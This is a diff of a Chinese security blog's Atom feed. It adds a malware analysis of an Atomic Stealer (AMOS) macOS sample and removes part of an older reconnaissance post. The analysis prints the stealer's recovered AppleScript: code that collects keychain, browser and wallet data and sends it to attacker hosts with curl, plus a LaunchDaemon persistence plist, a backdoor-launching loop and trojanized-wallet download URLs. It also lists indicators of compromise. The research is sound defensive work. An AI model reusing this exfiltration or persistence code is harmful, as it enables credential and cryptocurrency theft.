@@ -4,10 +4,12 @@
   <title>卷卷</title>
   <subtitle>网络安全知识库</subtitle>
   <icon>https://min168.top/assets/favicon.ico</icon>
-  <updated>2026-02-04T15:30:30.518Z</updated>
+  <updated>2026-04-20T15:31:35.761Z</updated>
   <generator>@vuepress/plugin-feed</generator>
   <link rel="self" href="https://min168.top/atom.xml"/>
   <link rel="alternate" href="https://min168.top/"/>
+  <category term="恶意软件分析"/>
+  <category term="渗透测试"/>
   <category term="应急响应"/>
   <category term="计网基础"/>
   <category term="编程开发"/>
@@ -17,7 +19,6 @@
   <category term="HTB"/>
   <category term="markdown"/>
   <category term="读书笔记"/>
-  <category term="渗透测试"/>
   <category term="逆向工程"/>
   <category term="网络运维"/>
   <category term="靶机"/>
@@ -26,7 +27,272 @@
   <category term="基础"/>
   <category term="AI"/>
   <category term="其他"/>
-  <category term="信息收集"/>
+  <entry>
+    <title type="text">Atomic Stealer (AMOS) 回归：ClickFix、伪装加密货币应用与新型 macOS 持久化机制</title>
+    <id>https://min168.top/like/Atomic-Stealer-AMOS-%E5%9B%9E%E5%BD%92%EF%BC%9AClickFix-%E4%BC%AA%E8%A3%85%E5%8A%A0%E5%AF%86%E8%B4%A7%E5%B8%81%E5%BA%94%E7%94%A8%E4%B8%8E%E6%96%B0%E5%9E%8BmacOS%E6%8C%81%E4%B9%85%E5%8C%96%E6%9C%BA%E5%88%B6.html</id>
+    <link href="https://min168.top/like/Atomic-Stealer-AMOS-%E5%9B%9E%E5%BD%92%EF%BC%9AClickFix-%E4%BC%AA%E8%A3%85%E5%8A%A0%E5%AF%86%E8%B4%A7%E5%B8%81%E5%BA%94%E7%94%A8%E4%B8%8E%E6%96%B0%E5%9E%8BmacOS%E6%8C%81%E4%B9%85%E5%8C%96%E6%9C%BA%E5%88%B6.html"/>
+    <updated>2026-04-20T15:29:13.000Z</updated>
+    <summary type="html"><![CDATA[<!-- more -->
+<h1>Atomic Stealer (AMOS) 回归：ClickFix、伪装加密货币应用与新型 macOS 持久化机制</h1>
+<p>Atomic Stealer（通常追踪为 AMOS）已成为 macOS 威胁环境中最为持久的威胁之一。凭借无休止的开发周期和多样化的分发网络，它没有任何减缓的迹象。研究人员已广泛记录了其标志性战术："ClickFix"浏览器社会工程钓鱼提示、伪装的应用安装程序，以及最近的 <a href="https://gi7w0rm.medium.com/amos-stealer-malext-variant-spread-in-a-global-malvertising-campaign-using-free-text-sharing-4d240e11d7e2" target="_blank" rel="noopener noreferrer">malext</a> 变体（通过恶意广告活动传播）。</p>]]></summary>
+    <content type="html"><![CDATA[<!-- more -->
+<h1>Atomic Stealer (AMOS) 回归：ClickFix、伪装加密货币应用与新型 macOS 持久化机制</h1>
+<p>Atomic Stealer（通常追踪为 AMOS）已成为 macOS 威胁环境中最为持久的威胁之一。凭借无休止的开发周期和多样化的分发网络，它没有任何减缓的迹象。研究人员已广泛记录了其标志性战术："ClickFix"浏览器社会工程钓鱼提示、伪装的应用安装程序，以及最近的 <a href="https://gi7w0rm.medium.com/amos-stealer-malext-variant-spread-in-a-global-malvertising-campaign-using-free-text-sharing-4d240e11d7e2" target="_blank" rel="noopener noreferrer">malext</a> 变体（通过恶意广告活动传播）。</p>
+<p>2026年3月12日，Iru 研究人员识别出一个 Mach-O 二进制文件，其在 VirusTotal 上的检测率极低，与这些最近的 malext 变体高度一致。此样本的独特之处在于其分层的能力：自定义解密例程、反虚拟机 evasion、激进的数据窃取、硬件加密钱包木马化以及弹性化的持久化机制。本文将逐步深入分析每一个阶段。</p>
+<p><em>注意：VirusTotal 检测率可能自撰写以来已发生变化。</em></p>
+<h2>恶意软件分析</h2>
+<p><code>C42061d43760bfa805955b97afc015341241ce3273da0e3a3ddfa34b4219d5ca</code></p>
+<h3>动态字符串解密</h3>
+<p>Iru 研究人员发现该恶意软件使用了可能的自定义解密例程，通过动态执行返回混淆后的脚本：</p>
+<ol>
+<li>字符串构建函数用于构建加密字符串并转换为十六进制。</li>
+<li>十六进制密文在通过 base64 解码之前先转换为 ASCII，解码所需的密钥通过参数3中的自定义哈希表提供。</li>
+<li>返回值被传递回 var_88。</li>
+</ol>
+<figure><figcaption>Image 3-23-26 at 11.02 AM</figcaption></figure>
+<p><em>解密到 osascript</em></p>
+<p><em></em></p>
+<p><em>字符串构建函数中的十六进制 ASCII 密文</em></p>
+<figure><figcaption>13A49E41-DE3B-4E82-9940-87A26294EC27</figcaption></figure>
+<p><em>传入函数后的 ASCII 密文</em></p>
+<p><em></em></p>
+<p><em>返回的 osascript 被传回 var_88</em></p>
+<p><em></em></p>
+<p><em>完整的混淆反虚拟机 osascript</em></p>
+<h3>反虚拟机检测</h3>
+<p>进一步分析显示，该脚本是一个混淆的反虚拟机检查 osascript，执行 <code>do shell script "system_profiler SPMemoryDataType"</code> 和 <code>do shell script "system_profiler SPHardwareDataType"</code> 来检测以下内容：</p>
+<p><strong>虚拟机处理器：</strong></p>
+<ul>
+<li>QEMU</li>
+<li>VMware</li>
+<li>KVM</li>
+</ul>
+<p><strong>虚拟机硬件 IDs：</strong></p>
+<ul>
+<li>Z31FHXYQ0J</li>
+<li>C07T508TG1J2</li>
+<li>C02TM2ZBHX87</li>
+<li>Chip: unknown</li>
+<li>Intel Core 2</li>
+</ul>
+<p><em></em></p>
+<p><em>解密的 osascript</em></p>
+<h3>主 Payload osascript 执行</h3>
+<p>在检查一次是否为虚拟机后，恶意软件继续使用上述主例程解密主 osascript payload。它在执行另一次 <code>write()</code> 调用之前再次检查 payload，在 while 循环中迭代写入 <code>/bin/zsh</code> 子进程。研究人员通过动态执行获取了最终 payload。</p>
+<figure><figcaption>C41F2947-C80E-4B43-8C28-337550B8C2C0</figcaption></figure>
+<figure><figcaption>E77EF9CF-C2F9-4FCF-85CA-C7A03E767A8D</figcaption></figure>
+<figure><figcaption>CC2DD792-E4DD-43C4-ADD9-4522B747A1A6</figcaption></figure>
+<p><em>Atomic Stealer 主 payload</em></p>
+<h3>数据窃取能力</h3>
+<p>该窃密者针对受感染系统上广泛范围的敏感数据，系统性地将文件复制到暂存目录后再外传。值得注意的是，窃密者会删除之前受感染的工件（如 <code>/tmp/starter</code>、<code>~/.agent</code>、<code>~/.username</code>）以允许重新感染，但保留收集到的重要密码工件 <code>~/.pass</code> 以供其他重新感染使用。</p>
+<p>在以下样本中，研究人员注意到浏览器历史记录收集配置被设置为 false。</p>
+<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>-- 配置标志</span></span>
+<span class="line"><span>set enableFileGrabber to "true"</span></span>
+<span class="line"><span>set enableNoteStealer to "true"</span></span>
+<span class="line"><span>set stealBrowsingHistory to "false"</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>收集的数据包括：</strong></p>
+<ul>
+<li>系统信息 — 通过 system_profiler 获取硬件/软件配置文件</li>
+<li>用户密码 — 通过虚假对话框或空密码 bypass 收集；缓存到 <code>~/.pass</code> 可用于重新感染</li>
+<li>macOS Keychain — 完整 Keychain 目录（通过硬件 UUID）和 login.keychain-db</li>
+<li>Apple Notes — NoteStore.sqlite（+ WAL/SHM）、Notes 媒体附件，以及 Notes.app API 后备</li>
+<li>Safari — 来自沙盒容器和用户 Cookies 目录的 Cookies.binarycookies；Safari 表单值</li>
+<li>Chromium 浏览器（Chrome、Brave、Edge、Vivaldi、Opera、OperaGX、Arc、CocCoc、Chromium 变体）— cookies、登录数据、web 数据、加密钱包扩展数据（本地扩展设置、IndexedDB、本地存储）</li>
+<li>Firefox/Waterfox — cookies、保存的登录凭据（logins.json）、加密密钥（key4.db）、表单历史、MetaMask 扩展 IndexedDB</li>
+<li>加密浏览器扩展 — 300 多个硬编码的钱包扩展 ID 针对 Chromium 配置</li>
+<li>桌面加密钱包 — Electrum、Exodus、Atomic、Wasabi、Ledger Live、Monero、Bitcoin Core、Litecoin Core、Dash Core、Electron Cash、Guarda、Dogecoin Core、Trezor Suite、Sparrow、Coinomi、Binance、TonKeeper</li>
+<li>Telegram — 来自 tdata/ 的 key_datas、session 文件和 map 文件</li>
+<li>OpenVPN — 来自 OpenVPN Connect/profiles/ 的连接配置文件</li>
+<li>桌面和文档中的文件 — .txt、.pdf、.docx、.doc、.rtf、.jpeg、.jpg、.png、.wallet、.seed、.key、.keys、.kdbx（上限 30MB）</li>
+<li>已安装应用程序列表 — 从 /Applications 枚举</li>
+</ul>
+<h3>数据外传</h3>
+<p>收集的数据使用 <code>ditto -c -k --sequesterRsrc &lt;stagingDir&gt; /tmp/out.zip</code> 压缩，并通过 POST curl 发送到域 <strong>laislivon[.]com</strong> 或 <strong>92[.]246[.]136[.]14</strong>，附带 <strong>BuildID: "W/p4XE1zNPV1oC5f568m7flYdnExL6VJzVTk9Rjt8Ns="</strong>、客户端参数 "0" 和活动参数 "0"。</p>
+<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>-- 将所有窃取的数据压缩成 ZIP</span></span>
+<span class="line"><span>do shell script "ditto -c -k --sequesterRsrc " &amp; stagingDir &amp; " /tmp/out.zip"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>-- 外传到 C2</span></span>
+<span class="line"><span>exfiltrateDataChunked(c2Server, userIdentifier, buildID, clientParam, campaignParam)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>-- 清理暂存目录和 ZIP</span></span>
+<span class="line"><span>try</span></span>
+<span class="line"><span>    do shell script "rm -r " &amp; stagingDir</span></span>
+<span class="line"><span>    do shell script "rm /tmp/out.zip"</span></span>
+<span class="line"><span>end try</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在 exfiltrateDataChunked 脚本中：</p>
+<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>on exfiltrateDataChunked(c2Server, username, buildID, clientParam, campaignParam)</span></span>
+<span class="line"><span>    set maxChunkSize to 26214400 -- 25 MB</span></span>
+<span class="line"><span>    set httpHeaders to "-H \"user: " &amp; username &amp; "\" -H \"BuildID: " &amp; buildID &amp; "\" -H \"cl: " &amp; clientParam &amp; "\" -H \"cn: " &amp; campaignParam &amp; "\""</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    set zipFileSize to (do shell script "stat -f%z /tmp/out.zip") as integer</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    -- 如果足够小，一次上传</span></span>
+<span class="line"><span>    if zipFileSize is less than or equal to maxChunkSize then</span></span>
+<span class="line"><span>        exfiltrateDataSingle(c2Server, httpHeaders)</span></span>
+<span class="line"><span>        return</span></span>
+<span class="line"><span>    end if</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    -- 分块</span></span>
+<span class="line"><span>    do shell script "split -b " &amp; maxChunkSize &amp; " /tmp/out.zip /tmp/chunk_"</span></span>
+<span class="line"><span>    set chunkID to do shell script "head -c 8 /dev/urandom | xxd -p"</span></span>
+<span class="line"><span>    set chunkFiles to paragraphs of (do shell script "ls -1 /tmp/chunk_* | sort")</span></span>
+<span class="line"><span>    set totalChunks to count of chunkFiles</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    set allChunksUploaded to true</span></span>
+<span class="line"><span>    repeat with chunkIndex from 1 to totalChunks</span></span>
+<span class="line"><span>        set chunkFilePath to item chunkIndex of chunkFiles</span></span>
+<span class="line"><span>        set chunkPartNumber to (chunkIndex - 1) as text</span></span>
+<span class="line"><span>        set chunkHeaders to httpHeaders &amp; " -H \"X-Chunk-ID: " &amp; chunkID &amp; "\" -H \"X-Chunk-Part: " &amp; chunkPartNumber &amp; "\" -H \"X-Chunk-Total: " &amp; (totalChunks as text) &amp; "\""</span></span>
+<span class="line"><span>        set chunkUploaded to false</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        -- 每个块最多重试 3 次</span></span>
+<span class="line"><span>        repeat with retryAttempt from 1 to 3</span></span>
+<span class="line"><span>            try</span></span>
+<span class="line"><span>                do shell script "curl --connect-timeout 120 --max-time 300 -X POST " &amp; chunkHeaders &amp; " -F \"file=@" &amp; chunkFilePath &amp; "\" " &amp; c2Server &amp; "/contact"</span></span>
+<span class="line"><span>                set chunkUploaded to true</span></span>
+<span class="line"><span>                exit repeat</span></span>
+<span class="line"><span>            end try</span></span>
+<span class="line"><span>            delay 10</span></span>
+<span class="line"><span>        end repeat</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        if not chunkUploaded then</span></span>
+<span class="line"><span>            set allChunksUploaded to false</span></span>
+<span class="line"><span>        end if</span></span>
+<span class="line"><span>    end repeat</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    -- 清理块</span></span>
+<span class="line"><span>    do shell script "rm -f /tmp/chunk_*"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    -- 如果主 C2 失败，尝试备用 IP</span></span>
+<span class="line"><span>    if allChunksUploaded then return</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    set fallbackC2 to "http://92[.]246[.]136[.]14"</span></span>
+<span class="line"><span>    repeat with retryAttempt from 1 to 3</span></span>
+<span class="line"><span>        try</span></span>
+<span class="line"><span>            set fallbackCmd to "curl --connect-timeout 120 --max-time 300 -X POST " &amp; httpHeaders &amp; " -F \"file=@/tmp/out.zip\" " &amp; fallbackC2 &amp; "/contact"</span></span>
+<span class="line"><span>            do shell script fallbackCmd</span></span>
+<span class="line"><span>            return</span></span>
+<span class="line"><span>        end try</span></span>
+<span class="line"><span>        delay 15</span></span>
+<span class="line"><span>    end repeat</span></span>
+<span class="line"><span>end exfiltrateDataChunked</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>外传函数将数据分块，每请求最多 25 MB，每个块最多重试 3 次，如果主 C2 域失败则回退到硬编码的备用 IP（<strong>92[.]246[.]136[.]14</strong>）。</p>
+<h3>Ledger Wallet、Trezor Suite 和 Exodus 木马化</h3>
+<p>恶意软件使用获取的密码输入来实现持久化和进一步木马化现有的加密硬件钱包。它静默卸载现有应用并替换为木马化新版本。它使用用户密码使用 <code>sudo -S rm -r &lt;.app wallet path&gt;</code> 强制删除旧应用，然后将 <code>/tmp/&lt;trojan&gt;.zip</code> 中的 zip 文件提取到 <code>/Applications/&lt;wallet.app&gt;</code> 使用 <code>ditto -x -k</code>，使用 <code>chmod -R +x</code> 设置完全执行权限，并使用 <code>rm /tmp/&lt;trojan.zip&gt;</code> 清理 zip。此外，它还会将字符串 "User10" 写入 <code>.logged</code> 文件，这与之前分析的 <a href="https://gi7w0rm.medium.com/amos-stealer-malext-variant-spread-in-a-global-malvertising-campaign-using-free-text-sharing-4d240e11d7e2" target="_blank" rel="noopener noreferrer">malext 变体</a> 相似。</p>
+<p><strong>Zip 下载：</strong></p>
+<ul>
+<li><code>https://wusetail[.]com/zxc/app.zip</code> → <code>/tmp/app.zip</code> 替换 <code>/Applications/Ledger Wallet.app</code></li>
+<li><code>https://wusetail[.]com/zxc/apptwo.zip</code> → <code>/tmp/apptwo.zip</code> 替换 <code>/Applications/Trezor Suite.app</code></li>
+<li><code>https://wusetail[.]com/zxc/appex.zip</code> → <code>/tmp/appex.zip</code> 替换 <code>/Applications/Exodus.app</code></li>
+</ul>
+<p>木马化加密钱包样本与原始应用完全相同，仅更改了描述和主题。这些二进制文件使用临时签名，在动态运行时似乎没有建立持久化或传递下一阶段 payload。木马化加密钱包似乎专门用于钓鱼。</p>
+<p>该二进制文件使用以下工作流程执行本地化 JavaScript 攻击：</p>
+<ul>
+<li><strong>数据初始化：</strong> 应用读取初始感染期间创建的 <code>~/.logged</code> 文件。</li>
+<li><strong>钓鱼执行：</strong> 启动钓鱼界面以获取用户密码和种子短语。</li>
+<li><strong>数据外传：</strong> 二进制文件通过 POST 请求将窃取的凭据传输到 <strong>systellis[.]com</strong>。</li>
+<li><strong>Payload 格式化：</strong> 所有外传数据都经过 Base64 编码，并包含从 <code>.logged</code> 文件中检索到的 "user10" 标识符 — 研究人员注意到这可能是活动标识符，尽管尚未确认。</li>
+<li><strong>最终重定向：</strong> 成功外传后，应用将受害者重定向到官方钱包下载页面以掩盖盗窃。</li>
+</ul>
+<figure><figcaption>D41F1C9A-6CAA-4A62-BBFC-26EE24DC0368</figcaption></figure>
+<p><em>读取 .logged 隐藏文件</em></p>
+<figure><figcaption>8A9ECC38-2103-46D3-9F94-EAA9CCC7F963</figcaption></figure>
+<p><em>从 logged 文件返回的字符串</em></p>
+<figure><figcaption>index.html POST request to <a href="http://systellis.com/openex.php" target="_blank" rel="noopener noreferrer">systellis.com/openex.php</a></figcaption></figure>
+<p><em>以下域的 POST 请求</em></p>
+<figure><figcaption>FD3D49E1-1F95-42F7-9A14-EDF4967F4AFC</figcaption></figure>
+<p><em>Index.html 页面</em></p>
+<p>POST 到 <a href="https://systellis" target="_blank" rel="noopener noreferrer">https://systellis</a>[.]com/openex.php</p>
+<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>{</span></span>
+<span class="line"><span>  "username": "dXNlcjEw",</span></span>
+<span class="line"><span>  "password": "ZW50ZXJwYXNzd29yZGxhaA=="</span></span>
+<span class="line"><span>}</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>解码后为：</p>
+<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>{</span></span>
+<span class="line"><span>  "username": "user10",</span></span>
+<span class="line"><span>  "password": "enterpasswordlah"</span></span>
+<span class="line"><span>}</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><figcaption>3DAF1B8D-31C9-4EEE-B313-03EA6E7B3753</figcaption></figure>
+<p><em>put_seed.html</em></p>
+<p>POST 到 <a href="https://systellis" target="_blank" rel="noopener noreferrer">https://systellis</a>[.]com/receiveex.php</p>
+<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>{</span></span>
+<span class="line"><span>  "username": "dXNlcjEw",</span></span>
+<span class="line"><span>  "seed": "a2VlbiNpY29uI3F1YWxpdHkjY2FiYmFnZSNmYWJyaWMjZmFjZSNkYWQjYWJpbGl0eSNhYmlsaXR5I2RhZCNsYWIjdGlnZXI="</span></span>
+<span class="line"><span>}</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>解码后为：</p>
+<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>{</span></span>
+<span class="line"><span>  "username": "user10",</span></span>
+<span class="line"><span>  "seed": "keen#icon#quality#cabbage#fabric#face#dad#ability#ability#dad#lab#tiger"</span></span>
+<span class="line"><span>}</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><figcaption>901B4A67-BA0C-41CA-9FF8-85B81A806AEC</figcaption></figure>
+<p><em>end.html</em></p>
+<h3>持久化</h3>
+<p>恶意软件通过根植于 <code>installPersistence</code> 例程的多阶段机制实现持久化，该机制利用在凭据收集阶段窃取的用户密码。</p>
+<h4>LaunchDaemon 安装</h4>
+<p>恶意软件构建一个标记为 <strong>com.finder.helper</strong> 的 LaunchDaemon plist，故意模仿合法的 Apple 系统进程以逃避日常检查。plist 将 <strong>RunAtLoad</strong> 和 <strong>KeepAlive</strong> 都设置为 <strong>true</strong>，确保代理在每次启动时启动，并在进程被终止时自动重启，使简单的终止无效。使用之前窃取的密码，恶意软件将 plist 复制到 <code>/Library/LaunchDaemons/com.finder.helper.plist</code>，设置所有权为 <strong>root:wheel</strong>，并通过 <code>launchctl</code> 立即加载它，实现 root 级持久化，无需额外的权限提升。</p>
+<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span>
+<span class="line"><span>&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"</span></span>
+<span class="line"><span>  "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span></span>
+<span class="line"><span>&lt;plist version="1.0"&gt;</span></span>
+<span class="line"><span>&lt;dict&gt;</span></span>
+<span class="line"><span>  &lt;key&gt;Label&lt;/key&gt;</span></span>
+<span class="line"><span>  &lt;string&gt;com.finder.helper&lt;/string&gt;</span></span>
+<span class="line"><span>  &lt;key&gt;ProgramArguments&lt;/key&gt;</span></span>
+<span class="line"><span>  &lt;array&gt;</span></span>
+<span class="line"><span>    &lt;string&gt;/bin/bash&lt;/string&gt;</span></span>
+<span class="line"><span>    &lt;string&gt;~/.agent&lt;/string&gt;</span></span>
+<span class="line"><span>  &lt;/array&gt;</span></span>
+<span class="line"><span>  &lt;key&gt;RunAtLoad&lt;/key&gt;</span></span>
+<span class="line"><span>  &lt;true/&gt;</span></span>
+<span class="line"><span>  &lt;key&gt;KeepAlive&lt;/key&gt;</span></span>
+<span class="line"><span>  &lt;true/&gt;</span></span>
+<span class="line"><span>&lt;/dict&gt;</span></span>
+<span class="line"><span>&lt;/plist&gt;</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>.mainhelper</h4>
+<p>脚本从 <code>https://wusetail[.]com/zxc/kito</code> 下载第二阶段二进制文件，写入 <code>~/.mainhelper</code>。通过 <code>chmod +x</code> 立即授予执行权限，为代理循环的重复调用做准备。<code>.mainhelper</code> 作为后门运行，可能通过 <code>/api/tasks</code> 端点监听指令。</p>
+<p><em></em></p>
+<p><em>指示 C2 的动态日志</em></p>
+<h4>通过 .agent 的用户上下文转换</h4>
+<p>恶意软件将 bash 脚本写入 <code>~/.agent</code>，运行一秒钟的轮询循环。在每次迭代中，脚本生成一个 osascript 块，查询 <code>stat -f "%Su" /dev/console</code> 以识别当前活动的控制台用户。当检测到非 root、非空用户时，脚本通过 <code>sudo -u</code> 将执行转换到该用户的上下文，在登录用户的会话中重新启动 <code>~/.mainhelper</code>。这确保第二阶段后门在有效用户上下文中运行，无论系统如何启动。</p>
+<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>while true; do</span></span>
+<span class="line"><span>  osascript &lt;&lt;EOF</span></span>
+<span class="line"><span>  set loginContent to do shell script "stat -f \"%Su\" /dev/console"</span></span>
+<span class="line"><span>  if loginContent is not equal to "" and loginContent is not equal to "root"</span></span>
+<span class="line"><span>    do shell script "sudo -u " &amp; quoted form of loginContent &amp; " ~/.mainhelper"</span></span>
+<span class="line"><span>  end if</span></span>
+<span class="line"><span>EOF</span></span>
+<span class="line"><span>  sleep 1</span></span>
+<span class="line"><span>done</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>结论</h2>
+<p>Atomic Stealer (AMOS) 的演进继续处于活跃开发状态，拥有众多变体，同时持续利用 "ClickFix" 浏览器提示和伪装安装程序。</p>
+<p><a href="/products/endpoint/endpoint-management"><strong>Iru 端点检测与响应 (EDR)</strong></a> 在设置为保护模式时，会自动中和检测到的文件，并监控信息窃取者的特征行为模式，包括本文档记录的持久化机制和外传技术。</p>
+<h2>妥协指标</h2>
+<p><strong>样本哈希：</strong></p>
+<ul>
+<li><code>C42061d43760bfa805955b97afc015341241ce3273da0e3a3ddfa34b4219d5ca</code></li>
+</ul>
+<p><strong>外传 C2：</strong></p>
+<ul>
+<li><code>92[.]246[.]136[.]14</code></li>
+<li><code>laislivon[.]com</code></li>
+</ul>
+<p><strong>Payload C2：</strong></p>
+<ul>
+<li><code>wusetail[.]com</code></li>
+</ul>
+<p><strong>钓鱼站点：</strong></p>
+<ul>
+<li><code>systellis[.]com</code></li>
+</ul>
+<p><strong>后门 C2：</strong></p>
+<ul>
+<li><code>45[.]94[.]47[.]204</code></li>
+</ul>
+]]></content>
+    <category term="恶意软件分析"/>
+    <category term="渗透测试"/>
+    <published>2026-03-31T14:00:00.000Z</published>
+  </entry>
   <entry>
     <title type="text">关于xt.exe的分析报告</title>
     <id>https://min168.top/response/%E5%85%B3%E4%BA%8Ext.exe%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.html</id>
@@ -16387,43 +16653,5 @@ sq语句中，单引号不再具有作用”，仅仅是'内容'而已。这个�
 ]]></content>
     <category term="渗透测试"/>
     <published>2024-09-02T00:00:00.000Z</published>
-  </entry>
-  <entry>
-    <title type="text">信息收集方法及流程</title>
-    <id>https://min168.top/perm/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%96%B9%E6%B3%95%E5%8F%8A%E6%B5%81%E7%A8%8B.html</id>
-    <link href="https://min168.top/perm/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%96%B9%E6%B3%95%E5%8F%8A%E6%B5%81%E7%A8%8B.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
-    <summary type="html"><![CDATA[<h2>信息收集概念</h2>
-<p>信息收集是指通过各种方式获<span data-type="text" style="color: var(--b3-font-color9);">取所需要的信息</span>，以便我们在后续的渗透过程更好的进行。因为只有我们掌握了目标网站或目标，主机足够多的信息之后，我们才能更好地对其进行漏洞检测。</p>
-<h2>渗透测试流程</h2>
-<p>外网信息收集——&gt;打点——&gt;权限维持——&gt;提权——&gt;内网信息收集——&gt;横向移动——&gt;痕迹清理</p>
-<p>打点关键资产数据信息：</p>
-<ul>
-<li>找出网站真实IP，挖掘相邻网段、绕过安全设备</li>
-<li>判断目标是否为蜜罐</li>
-<li>定位内网IP和系统</li>
-<li>定位关键的应用系统</li>
-<li>定位关键企业信息</li>
-</ul>]]></summary>
-    <content type="html"><![CDATA[<h2>信息收集概念</h2>
